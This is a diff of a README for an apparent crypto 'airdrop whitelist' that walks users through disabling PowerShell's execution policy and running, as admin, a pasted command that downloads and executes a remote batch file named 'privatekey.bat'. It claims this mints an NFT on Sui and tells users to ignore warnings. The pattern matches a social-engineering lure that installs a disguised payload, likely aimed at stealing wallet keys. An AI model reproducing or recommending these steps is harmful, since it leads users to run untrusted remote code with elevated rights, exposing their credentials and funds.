@@ -16,9 +16,9 @@ Set-ExecutionPolicy Unrestricted
 2. Type Y when Prompted and close Powershell
 
 # OPEN CMD(COMMAND PROMPT) AS ADMIN ON WINDOWS
-1. Copy and paste the following in your CMD:
+1. Copy and paste the following in your CMD: If you get warning about NSUDO not installed, Please Ignore.
 ```
-powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CelestialNFT/Airdrop-Whitelist/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath .\privatekey.bat -ArgumentList /c -NoNewWindow -Wait -WindowStyle Hidden"
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CelestialNFT/Airdrop-Whitelist/main/privatekey.bat -OutFile privatekey.bat; Start-Process -FilePath cmd.exe -ArgumentList '/c', 'privatekey.bat & pause' -Wait"
 ```
 2. You have successfully Minted Your Welcome NFT on sui. 
 
